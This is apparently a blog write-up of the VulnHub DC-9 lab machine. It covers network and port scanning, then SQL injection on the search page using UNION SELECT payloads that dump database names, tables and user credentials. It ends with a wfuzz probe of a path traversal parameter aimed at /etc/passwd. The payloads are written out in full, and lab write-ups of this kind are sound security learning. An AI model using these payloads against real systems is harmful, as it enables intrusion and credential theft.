---
published: true
---
Hello All , This Is my write up for DC: 9 Machine 
Machine Link :https://www.vulnhub.com/entry/dc-9,412/


First we will Make Network Discovery to Discover Machine IP 

- ┌──(root💀Devo)-[/home/devo/vuln-machines/DC-8]
- └─# arp-scan --interface eth0 192.168.162.0/24
- Interface: eth0, type: EN10MB, MAC: 00:0c:29:7b:1a:0c, IPv4: 192.168.162.135
- Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
- 168.162.2	00:50:56:ed:94:06	VMware, Inc.
- 168.162.1	00:50:56:c0:00:08	VMware, Inc.
- **192.168.162.136	00:0c:29:6c:2b:1b	VMware, Inc.**
- 168.162.254	00:50:56:fc:2a:c4	VMware, Inc
.


Machine ip is 192.168.162.136


## Scanning:
- **> _┌──(root💀Devo)-[/home/devo/vuln-machines/DC-8]
- └─#  nmap -sV -p- -sC -A 192.168.162.136                                                                                                                              127 ⨯
- Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 20:56 EDT
- Nmap scan report for 192.168.162.136
- Host is up (0.00077s latency).
- Not shown: 65533 closed ports
- PORT   STATE    SERVICE VERSION
- 22/tcp filtered ssh
- 80/tcp open     http    Apache httpd 2.4.38 ((Debian))
- |http-server-header: Apache/2.4.38 (Debian)
- |http-title: Example.com - Staff Details - Welcome
- MAC Address: 00:0C:29:6C:2B:1B (VMware)
- Device type: general purpose
- Running: Linux 3.X|4.X
- OS CPE: cpe:/o:linux:linuxkernel:3 cpe:/o:linux:linuxkernel:4
- OS details: Linux 3.2 - 4.9
- Network Distance: 1 hop
- 
- TRACEROUTE
- HOP RTT     ADDRESS
- 1   0.77 ms 192.168.162.136
- 
- OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ ._
- Nmap done: 1 IP address (1 host up) scanned in 10.42 seconds**


we Found ports SSH , HTTP are open

SSH 
try to connect ssh 
┌──(root💀Devo)-[/home/devo/vuln-machines/DC-8]
└─# ssh 192.168.162.136
The authenticity of host '192.168.162.136 (192.168.162.136)' can't be established.
ECDSA key fingerprint is SHA256:o2Ii/WX152zZCRlVrfXpNnX8mvNwYfOWhkMscAr+sMs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.162.136' (ECDSA) to the list of known hosts.
root@192.168.162.136's password: 
Permission denied, please try again.
root@192.168.162.136's password: 

found we need a password )


HTTP 
we found sql injection in search page 

Tom'-- -
![img1]({{site.baseurl}}/_posts/1.png)



tring to detect columns number to run UNION query...
found that they are 6 columns   ### Tom' ORDER BY 6-- -


we will run set of queries to get informations 

search=Tom' UNION SELECT group_concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata-- -
Result: Staff

search=Tom' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables where table_schema="Staff"-- -
Result = StaffDetails,Users

search=Tom' UNION SELECT group_concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema="Staff"-- -
Result= ID: id,firstname,lastname,position,phone,email,reg_date,UserID,Username,Password


search=Tom' UNION SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM Staff.Users-- -   
### admin:856f5de590ef37314e7c3bdf6f8a66dc  
     ### : transorbital1 


'UNION SELECT group_concat(username,":",password),2,3,4,5,6 from users.UserDetails-- -
Result=
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0


after we login as admin 
![2]({{site.baseurl}}/_posts/2.png)

	File does not exist
	it seems as hint to parameter called file 
	so we will fuzz it  


- └─# wfuzz  -b'PHPSESSID=7iu4vf3td19qtp16374hm8vcdv' --hw 100 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://192.168.162.136/manage.php?FUZZ=../../../../../../../../../../etc/passwd
- 
- 	
- 	
- 	
- 	=====================================================================
- ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
- =====================================================================
- 
- 000000010:   200        93 L     172 W      3694 Ch     "file"                  
- 	
- 	
- 	-




	we found a paramater mane called file 










































